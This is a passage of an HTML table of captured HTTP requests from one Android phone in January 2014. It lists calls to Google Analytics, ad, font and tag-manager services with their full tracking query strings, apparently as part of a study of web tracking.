      <td>                                                                                                                                                                                                                                            /__utm.gif?utmwv=5.4.6&amp;utms=6&amp;utmn=431677047&amp;utmhn=www.androidpit.de&amp;utme=8(st_teaser_bar_v3_%5Buser%5D*3!newsNavigationCount*5!st_teaser_bar_v3_%5Bsession%5D*st_teaser_bar_v3_%5Bpage%5D)9(3*3!0*5!3*3)11(1*5!2)&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=320x240&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=slimbean%20Build%204.3%20%E2%80%94%20Android%20Forum%20-%20AndroidPIT&amp;utmhid=1042539821&amp;utmr=-&amp;utmp=%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;utmht=1390123643127&amp;utmac=UA-7489116-21&amp;utmcc=__utma%3D228547149.678182810.1388960726.1389614896.1390123639.3%3B%2B__utmz%3D228547149.1388960730.1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B%2B__utmv%3D228547149.st_teaser_bar_v3%2520%253D%25203%3B&amp;utmmt=1&amp;utmu=qQAwAAAAAAAAAAAAAAQAAAB~</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>173</th>
      <td>  19997</td>
      <td>  173.194.70.102</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                        /collect?v=1&amp;_v=j15&amp;a=622979055&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fintelcrawler.com%2Fabout%2Fpress07&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fintelcrawler.com%252Fabout%252Fpress07&amp;ul=de-de&amp;de=UTF-8&amp;dt=IntelCrawler%20-%20Multi-tier%20Intelligence%20Aggregator%20-%20%22Decebal%22%20Point-of-Sale%20Malware%20-%20400%20lines%20of%20VBScript%20code%20from%20Romania%2C%20researchers%20warns%20about%20evolution%20of%20threats%20and%20interests%20to%20modern%20retailers&amp;sd=32-bit&amp;sr=800x1280&amp;vp=479x710&amp;je=0&amp;_u=ME~&amp;cid=570751254.1390051692&amp;tid=UA-46122210-1&amp;z=910916350</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>174</th>
      <td> 132676</td>
      <td> 173.194.116.168</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                    /collect?v=1&amp;_v=j15&amp;aip=1&amp;a=1403566109&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fwww.sueddeutsche.de%2Fkarriere%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;ul=de-de&amp;de=UTF-8&amp;dt=Hunderttausende%20Akademiker%20arbeiten%20zu%20Niederl%C3%B6hnen%20-%20Karriere%20-%20S%C3%BCddeutsche.de&amp;sd=32-bit&amp;sr=800x1280&amp;vp=479x710&amp;je=0&amp;_utma=6611437.1403719128.1390050886.1390050886.1390147627.2&amp;_utmz=6611437.1390147627.2.2.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect&amp;_utmht=1390147630325&amp;_u=cACC~&amp;cid=1403719128.1390050886&amp;tid=UA-19474199-5&amp;cd1=200&amp;z=484400949</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>175</th>
      <td>  16406</td>
      <td>  173.194.70.100</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                        /collect?v=1&amp;_v=j15&amp;aip=1&amp;a=2138069351&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;ul=de-de&amp;de=UTF-8&amp;dt=Redtube%3A%20Gutachten%20setzt%20Porno-Abmahner%20unter%20Druck%20-%20Digital%20-%20S%C3%BCddeutsche.de&amp;sd=32-bit&amp;sr=800x1280&amp;vp=479x710&amp;je=0&amp;_utma=6611437.1403719128.1390050886.1390050886.1390050886.1&amp;_utmz=6611437.1390050886.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect&amp;_utmht=1390051329333&amp;_u=cACC~&amp;cid=1403719128.1390050886&amp;tid=UA-19474199-5&amp;cd1=200&amp;z=283053957</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>176</th>
      <td>   4969</td>
      <td>  173.194.70.113</td>
      <td>              www.google-analytics.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                     /collect?v=1&amp;_v=j15&amp;aip=1&amp;a=725159496&amp;t=pageview&amp;_s=1&amp;dl=http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;dr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;ul=de-de&amp;de=UTF-8&amp;dt=M%C3%BCnchen-Haidhausen%20-%20Zehn%20Meter%20tiefes%20Loch%20im%20Gehweg%20-%20M%C3%BCnchen%20-%20S%C3%BCddeutsche.de&amp;sd=32-bit&amp;sr=800x1280&amp;vp=479x710&amp;je=0&amp;_utma=6611437.1403719128.1390050886.1390050886.1390050886.1&amp;_utmz=6611437.1390050886.1.1.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutmcmd%3Dreferral%7Cutmcct%3D%2Fredirect&amp;_utmht=1390050891510&amp;_u=cQAC~&amp;cid=1403719128.1390050886&amp;tid=UA-19474199-5&amp;cd1=200&amp;z=859363407</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>177</th>
      <td> 132320</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td> /__utm.gif?utmwv=5.4.6dc&amp;utms=1&amp;utmn=1993705442&amp;utmhn=www.sueddeutsche.de&amp;utme=8(Vermarktbar*Thema*Ressort*Dokumenttyp*URL)9(y*hochschulen*karriere*artikel*http%3A%2F%2Fwww.sueddeutsche.de%2Fkarriere%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212)&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=479x710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Hunderttausende%20Akademiker%20arbeiten%20zu%20Niederl%C3%B6hnen%20-%20Karriere%20-%20S%C3%BCddeutsche.de&amp;utmhid=1403566109&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;utmp=%2Fnachrichten_mobile%2Fkarriere%2Fthema%2Fhochschulen%2Fartikel%2Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne&amp;utmht=1390147627125&amp;utmac=UA-19474199-2&amp;utmcc=__utma%3D6611437.1403719128.1390050886.1390050886.1390147627.2%3B%2B__utmz%3D6611437.1390147627.2.2.utmcsr%3Dflipboard.com%7Cutmccn%3D(referral)%7Cutm...</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>178</th>
      <td>  16173</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td> /__utm.gif?utmwv=5.4.6dc&amp;utms=2&amp;utmn=1670436209&amp;utmhn=www.sueddeutsche.de&amp;utme=8(Vermarktbar*Thema*Ressort*Dokumenttyp*URL)9(y*streaming*digital*artikel*http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025)&amp;utmcs=UTF-8&amp;utmsr=800x1280&amp;utmvp=479x710&amp;utmsc=32-bit&amp;utmul=de-de&amp;utmje=0&amp;utmfl=-&amp;utmdt=Redtube%3A%20Gutachten%20setzt%20Porno-Abmahner%20unter%20Druck%20-%20Digital%20-%20S%C3%BCddeutsche.de&amp;utmhid=2138069351&amp;utmr=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;utmp=%2Fnachrichten_mobile%2Fdigital%2Fthema%2Fstreaming%2Fartikel%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis&amp;utmht=1390051327076&amp;utmac=UA-19474199-2&amp;utmcc=__utma%3D6611437.1403719128.1390050886.1390050886.1390050886.1%3B%2B__utmz%3D6611437.1390050886.1.1.utmcsr%3Dfli...</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>179</th>
      <td>  89059</td>
      <td>  173.194.70.156</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                        /gampad/ads?gdfp_req=1&amp;correlator=2717019624439808&amp;output=json_html&amp;callback=window.parent.googletag.impl.pubads.setAdContentsBySlotForAsync&amp;impl=fifs&amp;json_a=1&amp;iu_parts=3467634%2CNews_960x250%2CForum_728x90_below_2000px%2CForum_160x600%2CForum_300x250&amp;enc_prev_ius=%2F0%2F1%2C%2F0%2F2%2C%2F0%2F3%2C%2F0%2F4&amp;prev_iu_szs=960x250%2C728x90%2C160x600%2C300x250&amp;cookie=ID%3D255c5e010379289e%3AT%3D1388960731%3AS%3DALNI_MY6lVEnV1B2yGODKsTz1EtTNK_Lkw&amp;lmt=1390120036&amp;dt=1390123636720&amp;cc=33&amp;biw=320&amp;bih=240&amp;oid=3&amp;gut=v2&amp;ifi=1&amp;u_tz=60&amp;u_his=3&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_sd=1.67&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;adks=2176111127%2C1806238677%2C1358297623%2C956443525&amp;vrg=32&amp;vrp=32&amp;ga_vid=678182810.1388960726&amp;ga_sid=1390123637&amp;ga_hid=587405764&amp;ga_fc=true</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>180</th>
      <td>  89245</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                      /pagead/ads?client=ca-pub-1817266450476915&amp;output=html&amp;h=15&amp;slotname=4078688437&amp;adk=2218119946&amp;w=760&amp;lmt=1389611295&amp;color_bg=fbfbfb&amp;color_border=fbfbfb&amp;color_link=43a8da&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;dt=1389614895459&amp;shv=r20140107&amp;cbv=r20140107&amp;saldr=sb&amp;correlator=1389614893677&amp;frm=20&amp;ga_vid=678182810.1388960726&amp;ga_sid=1389614896&amp;ga_hid=2144196175&amp;ga_fc=1&amp;u_tz=60&amp;u_his=3&amp;u_java=0&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_nplug=0&amp;u_nmime=0&amp;dff=arial&amp;dfs=13&amp;adx=169&amp;ady=1303&amp;biw=320&amp;bih=240&amp;eid=33895331%2C317150312&amp;oid=3&amp;unviewed_position_start=1&amp;rx=0&amp;fc=2&amp;vis=0&amp;fu=0&amp;ifi=6&amp;xpc=9WAELiVzU0&amp;p=http%3A//www.androidpit.de&amp;dtd=57</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>181</th>
      <td>  89240</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                 /pagead/ads?client=ca-pub-1817266450476915&amp;output=html&amp;h=600&amp;slotname=2883975723&amp;adk=345326614&amp;w=160&amp;lmt=1388957132&amp;ea=0&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;dt=1388960732211&amp;shv=r20131210&amp;cbv=r20131209&amp;saldr=sb&amp;correlator=1388960732235&amp;frm=23&amp;ga_vid=678182810.1388960726&amp;ga_sid=1388960726&amp;ga_hid=2129303418&amp;ga_fc=1&amp;u_tz=60&amp;u_his=3&amp;u_java=0&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_nplug=0&amp;u_nmime=0&amp;dff=sans-serif&amp;dfs=16&amp;adx=-160&amp;ady=545&amp;biw=980&amp;bih=1410&amp;isw=160&amp;ish=600&amp;ifk=3896278517&amp;eid=317150311&amp;oid=3&amp;rs=0&amp;frmn=0&amp;vis=0&amp;fu=4&amp;ifi=1&amp;dtd=90</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>182</th>
      <td>  89334</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                /pagead/ads?client=ca-pub-1817266450476915&amp;output=html&amp;h=90&amp;slotname=9765689251&amp;adk=1289075668&amp;w=728&amp;lmt=1388957132&amp;ea=0&amp;flash=0&amp;url=http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3&amp;dt=1388960732054&amp;shv=r20131210&amp;cbv=r20131209&amp;saldr=sb&amp;correlator=1388960732091&amp;frm=23&amp;ga_vid=678182810.1388960726&amp;ga_sid=1388960726&amp;ga_hid=2105133366&amp;ga_fc=1&amp;u_tz=60&amp;u_his=3&amp;u_java=0&amp;u_h=1280&amp;u_w=800&amp;u_ah=1280&amp;u_aw=800&amp;u_cd=32&amp;u_nplug=0&amp;u_nmime=0&amp;dff=sans-serif&amp;dfs=16&amp;adx=144&amp;ady=3786&amp;biw=980&amp;bih=1410&amp;isw=728&amp;ish=90&amp;ifk=82575363&amp;eid=317150313&amp;oid=3&amp;rs=0&amp;brdim=0%2C129%2C0%2C129%2C800%2C0%2C800%2C1151%2C728%2C90&amp;vis=0&amp;fu=4&amp;ifi=1&amp;dtd=104</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>183</th>
      <td>  62291</td>
      <td>  173.194.70.157</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /pagead/adview?ai=B6BlkasLaUuL8KO3xyAPQpIDYCLX2uJoGAAAAEAEgADgAWL3F_pWHAWCVAoIBF2NhLXB1Yi0yNjE0NjY2MjYxNTc5NzQxsgEYd3d3LmRjbGstZGVmYXVsdC1yZWYuY29tugEJZ2ZwX2ltYWdlyAEJ2gEgaHR0cDovL3d3dy5kY2xrLWRlZmF1bHQtcmVmLmNvbS_AAgLgAgDqAhg0MDYxL2FwcC55dGhvbWUvX2RlZmF1bHT4Av3RHoADAZADjAaYA6QDqAMB4AQBoAYg2AYC&amp;sigh=ccaofuJWBm0&amp;adurl=</td>
      <td>                                                                                                                                  com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I) gzip</td>
    </tr>
    <tr>
      <th>184</th>
      <td>  62854</td>
      <td>  173.194.70.157</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /pagead/adview?ai=B6rsTicLaUoXYAo2i-gbf94GQCq25_c0EAAAAEAEgADgAUOaLpZ74_____wFY9b6FpWtglQKCARdjYS1wdWItMjYxNDY2NjI2MTU3OTc0MbIBGHd3dy5kY2xrLWRlZmF1bHQtcmVmLmNvbboBCWdmcF9pbWFnZcgBAtoBIGh0dHA6Ly93d3cuZGNsay1kZWZhdWx0LXJlZi5jb20vwAIC4AIA6gIpNDA2MS9hcHAueXRwd2F0Y2guZW50ZXJ0YWlubWVudC9tYWluXzg5Mzj4Av3RHpADjAaYA6QDqAMB0ASQTuAEAaAGMtgGAg&amp;sigh=Vq7JIfuxoVI</td>
      <td>                                                                                                                                  com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I) gzip</td>
    </tr>
    <tr>
      <th>185</th>
      <td>  23972</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390052022&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>186</th>
      <td>  25754</td>
      <td>  173.194.70.157</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390053879&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>187</th>
      <td>  61969</td>
      <td>  173.194.70.156</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390068090&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>188</th>
      <td>  69160</td>
      <td>  173.194.70.156</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390068519&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>189</th>
      <td>  77062</td>
      <td>  173.194.70.157</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390083647&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>190</th>
      <td> 138476</td>
      <td>  173.194.70.157</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /pagead/conversion/1001680686/?label=4dahCKKczAYQrt7R3QM&amp;value=&amp;muid=myTNNlwjHP2x7sOPdZUceA&amp;bundleid=com.google.android.youtube&amp;appversion=5.3.32&amp;osversion=4.3.1&amp;sdkversion=ct-sdk-a-v1.1.0&amp;remarketing_only=1&amp;timestamp=1390148833&amp;data=screen_name%3D%3CAndroid_YT_Open_App%3E</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>191</th>
      <td>  16190</td>
      <td>  173.194.70.157</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /pixel?google_nid=9675309&amp;google_hm=bnRnR1JQd0IzMVlhMThxY2xKQlJkZFFRYVBNcnhnTFo%3D&amp;google_cm&amp;google_sc</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>192</th>
      <td>  16302</td>
      <td>  173.194.70.157</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /pixel?google_nid=9675309&amp;google_hm=bnRnR1JQd0IzMVlhMThxY2xKQlJkZFFRYVBNcnhnTFo%3D&amp;google_cm=&amp;google_sc=&amp;google_tc=</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>193</th>
      <td>  89554</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /simgad/16975570946260456591</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>194</th>
      <td>  89337</td>
      <td>  173.194.70.154</td>
      <td>              www.googleadservices.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /simgad/17705960718182275898</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>195</th>
      <td>  19576</td>
      <td>   173.194.70.95</td>
      <td>                    www.googleapis.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /css?family=Open+Sans:400,600&amp;subset=latin,cyrillic</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>196</th>
      <td>  89612</td>
      <td>   173.194.70.95</td>
      <td>                    www.googleapis.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /css?family=Roboto:300</td>
      <td>                                                                                    Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30</td>
    </tr>
    <tr>
      <th>197</th>
      <td>  74599</td>
      <td>   173.194.70.95</td>
      <td>                    www.googleapis.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /maps/api/elevation/xml?locations=52.501904,13.342198&amp;sensor=false</td>
      <td>                                                                                                                                                                                                                           None</td>
    </tr>
    <tr>
      <th>198</th>
      <td> 132446</td>
      <td> 173.194.116.190</td>
      <td>              www.googletagmanager.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   /gtm.js?id=GTM-PXNL5Z</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>199</th>
      <td>   3885</td>
      <td>  173.194.70.155</td>
      <td>             www.googletagservices.com</td>
      <td> GET</td>
